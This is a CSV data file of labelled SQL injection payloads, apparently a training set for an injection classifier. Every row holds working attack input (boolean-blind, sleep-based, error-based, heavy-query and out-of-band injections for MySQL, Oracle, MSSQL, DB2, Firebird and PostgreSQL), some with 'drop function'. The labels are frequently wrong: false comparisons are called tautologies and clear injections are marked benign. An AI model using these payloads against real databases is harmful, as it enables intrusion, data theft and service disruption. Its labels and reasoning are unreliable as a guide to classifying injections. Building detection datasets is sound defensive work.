id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18641,"1' ) ) as mdtm where 1393 = 1393 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,0.85,injected WHERE-tautology 'where 1393 = 1393' is boolean true oracle ; db_engine=generic,2
18642,"1', ( select ( case when ( 1902 = 5536 ) then 1 else 1902* ( select 1902 from master..sysdatabases ) end ) )",boolean_blind,mssql,0.95,numeric tautology '1902 = 5536' acts as boolean true branch ; db_engine=mssql,3
18643,"1' and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",boolean_blind,db2,0.50,UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1' and 3707 = ( select count ( * ) from sysibm.systables as ',0
18644,-4057' ) order by 1#,benign,generic,0.50,UNCERTAIN: no rule-pattern match; both sources A and C agree on 'benign'. Payload fragment: '-4057' ) order by 1#',0
18645,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 3127 = 3127",boolean_blind,generic,0.85,numeric tautology '3127 = 3127' acts as boolean true branch ; db_engine=generic,2
18646,"1' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'aezm' like 'aezm",boolean_blind,oracle,0.95,LIKE tautology ''aezm' like 'aezm' yields boolean true/false ; secondary signals: 'all_users' (heavy_query) ; db_engine=oracle,3
18647,"1"" where 7380 = 7380 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.95,injected WHERE-tautology 'where 7380 = 7380' is boolean true oracle ; db_engine=generic,3
18648,"1' ) as rqfq where 7077 = 7077 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.95,injected WHERE-tautology 'where 7077 = 7077' is boolean true oracle ; db_engine=firebird,3
18649,"1 ) as cejp where 4736 = 4736 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,oracle,0.95,injected WHERE-tautology 'where 4736 = 4736' is boolean true oracle ; secondary signals: 'all_users' (heavy_query) ; db_engine=oracle,3
18650,"1' or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and 'nhmz' like 'nhmz",boolean_blind,mysql,0.85,numeric tautology '1808 = 1808' acts as boolean true branch ; db_engine=mysql,2
18651,-4248 where 3288 = 3288 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,boolean_blind,oracle,0.85,injected WHERE-tautology 'where 3288 = 3288' is boolean true oracle ; secondary signals: 'xmltype (' (error_based) ; db_engine=oracle,2
18652,"1' ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 'dsok' = 'dsok",boolean_blind,mysql,0.85,numeric tautology '9067 = 9067' acts as boolean true branch ; db_engine=mysql,2
18653,"1'+ ( select llcl where 8188 = 8188 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.95,injected WHERE-tautology 'where 8188 = 8188' is boolean true oracle ; db_engine=generic,3
18654,"1' in boolean mode ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) #",heavy_query,oracle,0.75,5 cartesian aliases of 'all_users' produce row explosion → heavy_query ; db_engine=oracle,1
18655,"1 ) ) as amyr where 7875 = 7875 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,0.85,injected WHERE-tautology 'where 7875 = 7875' is boolean true oracle ; db_engine=generic,2
18656,-7175' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and 'upzo' = 'upzo,boolean_blind,oracle,0.75,numeric tautology '4493 = 4493' acts as boolean true branch ; secondary signals: 'utl_inaddr.get_host_address' (out_of_band) ; db_engine=oracle,1
18657,"1' ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'ozef' = 'ozef",boolean_blind,generic,0.50,UNCERTAIN: no specific SQLi signal token matched in payload '1' ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_subst'; cannot determine type confidently.,0
18658,"1"" ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""wvlb"" like ""wvlb",heavy_query,oracle,0.75,5 cartesian aliases of 'all_users' produce row explosion → heavy_query ; db_engine=oracle,1
18659,-3084%' ) ) order by 1--,benign,generic,0.50,UNCERTAIN: no rule-pattern match; both sources A and C agree on 'benign'. Payload fragment: '-3084%' ) ) order by 1--',0
18660,"1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'adsh' = 'adsh",boolean_blind,generic,0.50,UNCERTAIN: no specific SQLi signal token matched in payload '1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substri'; cannot determine type confidently.,0
18661,"1' in boolean mode ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) #",boolean_blind,mysql,0.85,numeric tautology '1808 = 1808' acts as boolean true branch ; secondary signals: 'updatexml (' (error_based) ; db_engine=mysql,2
18662,"1 or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,numeric tautology '5873 = 5873' acts as boolean true branch ; secondary signals: 'sleep (' (time_blind) ; db_engine=mysql,2
18663,"1' ) ) as prxm where 1267 = 1267 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.95,injected WHERE-tautology 'where 1267 = 1267' is boolean true oracle ; db_engine=generic,3
18664,"1' ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 'gcna' = 'gcna",boolean_blind,firebird,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1' ) and 6414 = ( select count ( * ) from rdb$fields as t1,r'",0
18665,1' ) ) order by 1#,benign,generic,0.50,UNCERTAIN: no rule-pattern match; both sources A and C agree on 'benign'. Payload fragment: '1' ) ) order by 1#',0
18666,"end and ( ( ( ""zpii"" like ""zpii",boolean_blind,generic,0.50,"UNCERTAIN: no specific SQLi signal token matched in payload 'end and ( ( ( ""zpii"" like ""zpii'; cannot determine type confidently.",0
18667,select ( case when ( 5970 = 2200 ) then 1 else 5970* ( select 5970 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.95,numeric tautology '5970 = 2200' acts as boolean true branch ; db_engine=mssql,3
18668,"1%"" ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1%"" ) ) or 5356 = ( select count ( * ) from sysusers as sys1'",0
18669,"1' ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 'iqvg' = 'iqvg",boolean_blind,firebird,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1' ) or 7552 = ( select count ( * ) from rdb$fields as t1,rd'",0
18670,"1%"" ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,numeric tautology '5873 = 5873' acts as boolean true branch ; secondary signals: 'sleep (' (time_blind) ; db_engine=mysql,2
18671,"1' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",boolean_blind,mysql,0.85,numeric tautology '6270 = 6270' acts as boolean true branch ; secondary signals: 'exp (' (error_based) ; db_engine=mysql,2
18672,"1 ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 8738 = 8738",boolean_blind,generic,0.95,numeric tautology '8738 = 8738' acts as boolean true branch ; db_engine=generic,3
18673,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( 'wusq' = 'wusq",benign,generic,0.85,No SQLi tokens found in payload (no UNION/SLEEP/extractvalue/OR 1=1/--/;EXEC etc.); payload appears as benign SQL fragment 'select count ( * ) from domain.domains a',1
18674,"1%"" ) order by 1#",benign,generic,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'benign'. Payload fragment: '1%"" ) order by 1#'",0
18675,"1 ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 4666 = 4666",boolean_blind,generic,0.95,numeric tautology '4666 = 4666' acts as boolean true branch ; db_engine=generic,3
18676,"1' ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.50,UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1' ) ) or 7417 = ( select count ( * ) from sysibm.systables ',0
18677,1' ) ) as yqcl where 5026 = 5026 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,boolean_blind,mysql,0.95,injected WHERE-tautology 'where 5026 = 5026' is boolean true oracle ; secondary signals: 'sleep (' (time_blind) ; db_engine=mysql,3
18678,"-6803"" ) order by 1#",benign,generic,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'benign'. Payload fragment: '-6803"" ) order by 1#'",0
18679,"select * from generate_series ( 9709,9709,case when ( 9709 = 7795 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,0.95,numeric tautology '9709 = 7795' acts as boolean true branch ; secondary signals: 'generate_series' (heavy_query) ; db_engine=postgresql,3
18680,"1"" ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""frgb"" like ""frgb",boolean_blind,oracle,0.95,numeric tautology '7756 = 7756' acts as boolean true branch ; db_engine=oracle,3
18681,"1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",boolean_blind,mysql,0.85,numeric tautology '6237 = 6237' acts as boolean true branch ; secondary signals: 'union select' (union_based) ; db_engine=mysql,2
18682,"1' ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",boolean_blind,firebird,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1' ) or 7552 = ( select count ( * ) from rdb$fields as t1,rd'",0
18683,-9622' ) ) ) order by 1#,benign,generic,0.50,UNCERTAIN: no rule-pattern match; both sources A and C agree on 'benign'. Payload fragment: '-9622' ) ) ) order by 1#',0
18684,"1'+ ( select 'bmit' where 3716 = 3716 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) ) +'",boolean_blind,mysql,0.85,injected WHERE-tautology 'where 3716 = 3716' is boolean true oracle ; secondary signals: 'union select' (union_based) ; db_engine=mysql,2
18685,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( ""dqou"" like ""dqou",boolean_blind,db2,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: 'select count ( * ) from sysibm.systables as t1,sysibm.systab'",0
18686,"1"" ) as idwa where 2545 = 2545 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.95,injected WHERE-tautology 'where 2545 = 2545' is boolean true oracle ; db_engine=firebird,3
18687,1 ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 5139 = 5139,boolean_blind,oracle,0.85,numeric tautology '3754 = 3754' acts as boolean true branch ; secondary signals: 'xmltype (' (error_based) ; db_engine=oracle,2
18688,-7962' ) ) as pgqz where 6058 = 6058 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,boolean_blind,oracle,0.75,injected WHERE-tautology 'where 6058 = 6058' is boolean true oracle ; secondary signals: 'utl_inaddr.get_host_address' (out_of_band) ; db_engine=oracle,1
18689,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""gjtx"" like ""gjtx",boolean_blind,generic,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: 'select count ( * ) from domain.domains as t1,domain.columns '",0
18690,"1 ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.50,UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1 ) and 3580 = ( select count ( * ) from domain.domains as t',0
18691,"1"" and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1"" and 8189 = ( select count ( * ) from sysibm.systables as '",0
18692,if ( 9953 = 4347 ) select 9953 else drop function ocau--,boolean_blind,generic,0.95,numeric tautology '9953 = 4347' acts as boolean true branch ; db_engine=generic,3
18693,"1' ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 'vcph' = 'vcph",boolean_blind,mysql,0.85,numeric tautology '8190 = 8190' acts as boolean true branch ; secondary signals: 'exp (' (error_based) ; db_engine=mysql,2
18694,"1'|| ( select 'zifu' from dual where 4822 = 4822 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,oracle,0.95,injected WHERE-tautology 'where 4822 = 4822' is boolean true oracle ; secondary signals: 'all_users' (heavy_query) ; db_engine=oracle,3
18695,"1 ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( 9270 = 9270",boolean_blind,mysql,0.85,numeric tautology '1297 = 1297' acts as boolean true branch ; secondary signals: 'extractvalue (' (error_based) ; db_engine=mysql,2
18696,"1"" where 8697 = 8697 and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,injected WHERE-tautology 'where 8697 = 8697' is boolean true oracle ; secondary signals: 'sleep (' (time_blind) ; db_engine=mysql,3
18697,"1 ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )",boolean_blind,mysql,0.85,numeric tautology '1045 = 1045' acts as boolean true branch ; secondary signals: 'union select' (union_based) ; db_engine=mysql,2
18698,"1' ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'jhle' like 'jhle",boolean_blind,generic,0.85,LIKE tautology ''jhle' like 'jhle' yields boolean true/false ; db_engine=generic,2
18699,"1'|| ( select 'ejuu' from dual where 2903 = 2903 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) ||'",boolean_blind,oracle,0.95,injected WHERE-tautology 'where 2903 = 2903' is boolean true oracle ; db_engine=oracle,3
18700,"1%' or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and '%' = '",benign,generic,0.85,No SQLi tokens found in payload (no UNION/SLEEP/extractvalue/OR 1=1/--/;EXEC etc.); payload appears as benign SQL fragment '1%' or 4411 = ( select count ( * ) from ',1
18701,"1'|| ( select 'setd' from dual where 3686 = 3686 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) ) ||'",boolean_blind,oracle,0.85,injected WHERE-tautology 'where 3686 = 3686' is boolean true oracle ; db_engine=oracle,2
18702,"1"" ) ) as thoj where 1577 = 1577 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,0.85,injected WHERE-tautology 'where 1577 = 1577' is boolean true oracle ; db_engine=generic,2
18703,"select * from generate_series ( 5206,5206,case when ( 5206 = 2214 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,0.95,numeric tautology '5206 = 2214' acts as boolean true branch ; secondary signals: 'generate_series' (heavy_query) ; db_engine=postgresql,3
18704,"1' in boolean mode ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,0.50,UNCERTAIN: no specific SQLi signal token matched in payload '1' in boolean mode ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = '; cannot determine type confidently.,0
18705,"1"" and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""ouix"" = ""ouix",boolean_blind,generic,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1"" and 8514 = ( select count ( * ) from domain.domains as t1'",0
18706,1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 'pemj' = 'pemj,boolean_blind,mysql,0.95,'RLIKE' MySQL regex used for boolean inference ; secondary signals: 'sleep (' (time_blind) ; db_engine=mysql,3
18707,"1' ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( 'agsi' = 'agsi",boolean_blind,db2,0.50,UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1' ) ) or 8315 = ( select count ( * ) from sysibm.systables ',0
18708,"1%' or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1%' or 2367 = ( select count ( * ) from rdb$fields as t1,rdb'",0
18709,"1' ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",boolean_blind,generic,0.50,UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1' ) or 9643 = ( select count ( * ) from domain.domains as t',0
18710,"1 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) # ehsr",boolean_blind,db2,0.50,UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1 or 8315 = ( select count ( * ) from sysibm.systables as t1',0
18711,"1 ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )",boolean_blind,generic,0.50,UNCERTAIN: no specific SQLi signal token matched in payload '1 ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substr'; cannot determine type confidently.,0
18712,"1' where 1031 = 1031 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,0.85,injected WHERE-tautology 'where 1031 = 1031' is boolean true oracle ; db_engine=generic,2
18713,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""%"" = """,benign,db2,0.85,No SQLi tokens found in payload (no UNION/SLEEP/extractvalue/OR 1=1/--/;EXEC etc.); payload appears as benign SQL fragment 'select count ( * ) from sysibm.systables',1
18714,"1%"" ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ""%"" = """,boolean_blind,mysql,0.85,numeric tautology '5451 = 5451' acts as boolean true branch ; db_engine=mysql,2
18715,1 ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 1476 = 1476,boolean_blind,mysql,0.95,numeric tautology '1476 = 1476' acts as boolean true branch ; secondary signals: 'sleep (' (time_blind) ; db_engine=mysql,3
18716,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt' = 'qipt",heavy_query,oracle,0.75,5 cartesian aliases of 'all_users' produce row explosion → heavy_query ; db_engine=oracle,1
18717,"1' ) where 7646 = 7646 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.95,injected WHERE-tautology 'where 7646 = 7646' is boolean true oracle ; db_engine=generic,3
18718,"1"" and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ""okpa"" = ""okpa",boolean_blind,mysql,0.85,numeric tautology '7982 = 7982' acts as boolean true branch ; secondary signals: 'extractvalue (' (error_based) ; db_engine=mysql,2
18719,"1 ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,numeric tautology '5873 = 5873' acts as boolean true branch ; secondary signals: 'sleep (' (time_blind) ; db_engine=mysql,2
18720,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( 'ahjo' = 'ahjo",boolean_blind,generic,0.50,"UNCERTAIN: no specific SQLi signal token matched in payload 'call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )'; cannot determine type confidently.",0
18721,"1%"" ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ""%"" = """,boolean_blind,generic,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1%"" ) ) and 6510 = ( select count ( * ) from sysusers as sys'",0
18722,if ( 4735 = 8907 ) select 4735 else drop function qigo--,boolean_blind,generic,0.95,numeric tautology '4735 = 8907' acts as boolean true branch ; db_engine=generic,3
18723,"1 where 5485 = 5485 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,0.85,injected WHERE-tautology 'where 5485 = 5485' is boolean true oracle ; db_engine=generic,2
18724,"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and 'cipk' = 'cipk",boolean_blind,mysql,0.85,numeric tautology '7982 = 7982' acts as boolean true branch ; secondary signals: 'extractvalue (' (error_based) ; db_engine=mysql,2
18725,select ( case when ( 9619 = 8679 ) then 1 else 9619* ( select 9619 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.95,numeric tautology '9619 = 8679' acts as boolean true branch ; db_engine=mssql,3
18726,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( '%' = '",benign,generic,0.85,No SQLi tokens found in payload (no UNION/SLEEP/extractvalue/OR 1=1/--/;EXEC etc.); payload appears as benign SQL fragment 'select count ( * ) from domain.domains a',1
18727,-1621' in boolean mode ) order by 1--,benign,generic,0.50,UNCERTAIN: no rule-pattern match; both sources A and C agree on 'benign'. Payload fragment: '-1621' in boolean mode ) order by 1--',0
18728,"1' ) ) as omwk where 1414 = 1414 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,0.85,injected WHERE-tautology 'where 1414 = 1414' is boolean true oracle ; db_engine=generic,2
18729,"1'|| ( select 'qwoo' from dual where 8802 = 8802 or elt ( 6272 = 6272,sleep ( 5 ) ) ) ||'",boolean_blind,oracle,0.95,injected WHERE-tautology 'where 8802 = 8802' is boolean true oracle ; secondary signals: 'sleep (' (time_blind) ; db_engine=oracle,3
